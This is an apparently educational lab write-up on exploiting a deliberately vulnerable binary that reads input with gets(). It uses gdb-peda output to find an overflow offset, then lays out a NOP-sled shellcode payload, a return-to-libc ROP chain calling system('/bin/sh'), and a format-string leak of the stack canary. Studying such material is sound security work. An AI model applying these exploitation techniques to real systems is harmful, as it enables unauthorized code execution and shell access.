# Documentation for Exploitation

## No defenses

First using a pattc, patto to determine the offset needed to overwrite instruction pointer.
```
gdb-peda$ r < test
Starting program: /home/kair0s3/CS5231/binary/vulnerable < test

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffda10 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
RBX: 0x4011f0 (<__libc_csu_init>:	endbr64)
RCX: 0x7ffff7fb0980 --> 0xfbad2088
RDX: 0x0
RSI: 0x4052a1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAA"...)
RDI: 0x7ffff7fb27f0 --> 0x0
RBP: 0x415243416d434151 ('QACmACRA')
RSP: 0x7fffffffdf58 ("CoACSACpACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-R"...)
RIP: 0x4011b6 (<vulnerable+64>:	ret)
R8 : 0x7fffffffda10 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
R9 : 0x7fffffffda40 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA"...)
R10: 0x7ffff7fb0be0 --> 0x4062a0 --> 0x0
R11: 0x7fffffffe1c0 ("qADUADrADVADtADWADuADXADvADYADwA")
R12: 0x401090 (<_start>:	endbr64)
R13: 0x7fffffffe060 ("(BA($A(nA(CA(-A((A(DA(;A()A(EA(aA(0A(FA(bA(1A(GA(cA(2A(HA(dA(3A(IA(eA(4A(JA(fA(5A(KA(gA(6A(LA(hA(7A(MA(iA(8A(NA(jA(9A(OA(kA(PA(lA(QA(mA(RA(oA(SA(pA(TA(qA(UA(rA(VA(tA(WA(uA(XA(vA(YA(wA(ZA(xA(yA(zAD%ADs"...)
R14: 0x0
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011af <vulnerable+57>:	call   0x401080 <gets@plt>
   0x4011b4 <vulnerable+62>:	nop
   0x4011b5 <vulnerable+63>:	leave  
=> 0x4011b6 <vulnerable+64>:	ret    
   0x4011b7 <main>:	endbr64
   0x4011bb <main+4>:	push   rbp
   0x4011bc <main+5>:	mov    rbp,rsp
   0x4011bf <main+8>:	sub    rsp,0x10
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf58 ("CoACSACpACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-R"...)
0008| 0x7fffffffdf60 ("ACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-"...)
0016| 0x7fffffffdf68 ("UACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA"...)
0024| 0x7fffffffdf70 ("CtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-V"...)
0032| 0x7fffffffdf78 ("ACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-"...)
0040| 0x7fffffffdf80 ("YACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA"...)
0048| 0x7fffffffdf88 ("CxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA-YA-wA-Z"...)
0056| 0x7fffffffdf90 ("A-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA-YA-wA-ZA-xA-yA-"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011b6 in vulnerable ()
gdb-peda$ patto CoACSA
CoACSA found at offset: 1352
```

Knowing the offset, we can overwrite the return address to somewhere on our NOP sled. i.e. `0x7fffffffdab0`

Then include our payload in the format of
```
<NOP_SLED#1> <------
<SHELLCODE>        |
<NOP_SLED#2>       |
<return_address> --|
```


## NX Enabled

Since NX is enabled, we cannot run the shellcode in our stack. So, we can leverage on Return-to-libc (with ROP).

Now, we just need to find all the necessary values (or addresses) needed.

First we look for the system calls - `system` and `exit`
```
gdb-peda$ p system
$1 = {int (const char *)} 0x7ffff7e16290 <__libc_system>
gdb-peda$ p exit
$2 = {void (int)} 0x7ffff7e0aa40 <__GI_exit>
```

Next, we need the `pop rdi` to set the parameter for `system()`. This can be done by dumping the gadgets.
```
gdb-peda$ dumprop
Warning: this can be very slow, do not run for large memory range
Writing ROP gadgets to file: vuln-rop.txt ...
0x40115e: ret <------- in case of alignment issues
0x4010c3: cli; ret
0x4010ef: nop; ret
0x4011b5: leave; ret
0x4010c1: nop edx; ret
0x4010c0: endbr64; ret
0x40112e: jmp rax; ret
0x40115d: pop rbp; ret
0x401253: pop rdi; ret <------- USEFUL
0x401252: pop r15; ret
```

To find a string for the `pop rdi` to use, we will be using `/bin/sh` or `id`

```
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7f785bd --> 0x68732f6e69622f ('/bin/sh')

gdb-peda$ find id
Searching for 'id' in: None ranges
Found 225 results, display max 225 items:
      libc : 0x7ffff7dd5ed6 --> 0x7761725f5f006469 ('id')
```

Now, we have the necessary addresses
```
0x7ffff7f785bd --> "/bin/sh"
0x7ffff7dd5ed6 --> "id"
0x7ffff7e16290 --> system
0x7ffff7e0aa40 --> exit
0x401253 --> "pop rdi; ret"
0x40115e --> "ret"
```

Payload Format
```
<NOP_SLED> (1352 bytes)
<RET>
<POP_RDI>
<"id" or "/bin/sh">
<SYSTEM>
<EXIT>
```

## NX and Canary Enabled

Since NX and canary is enabled, we have the same rules as of the above. But this time, we need to fix the canary values for the exploit to work.

For this, we can make use of the format string attack to leak out the canary, before using it in our attack.

Using a for loop to iterate the positions for the format string attack and regex to check the pattern matching `0x.{14}00`, we can match the likely canaries found on the stack.

In pseudocode.
```
for i in range of 0 - 750
  get the pos i format string value -> %{i}$llx
  if the returned value matches '0x.{14}00'
    append it to a list

then finally, print out the list of positions found and its respective values.
```

And with that we can run it twice to check

```
# Run 1
[177, 307, 311, 365, 380, 593, 610, 625]
['0xe43353855a5f8400', '0xb9f6ee255aae9500', '0x75762f2e00000000', '0x54535f5355424400', '0x5345535f47445800', '0x5255435f47445800', '0x5441434f564e4900', '0x74783d4d52455400']

# Run 2
[177, 307, 311, 365, 380, 593, 610, 625]
['0x7fd7ce60a3969300', '0xcd8e94b082c0e300', '0x75762f2e00000000', '0x54535f5355424400', '0x5345535f47445800', '0x5255435f47445800', '0x5441434f564e4900', '0x74783d4d52455400']
```

From this, we can see some interesting value changes

```
# Changes noted
pos 177, 0xe43353855a5f8400 -> 0x7fd7ce60a3969300
pos 307, 0xb9f6ee255aae9500 -> 0xcd8e94b082c0e300
```

To test which position actually contains the canary value, we can send the payload in the format
```
<overflow>
<canaryVal from 177 and 307 respectively>
```

This results in position 177 giving us `Return properly!`.

Hence 177 must be where our canary value is held.

Then can simply need to fix the canary and append the remaining of the payload as previous exploitation for NX.

As such, we crafted the exploit as of `exploitCanary.py` to automate the exploitation.
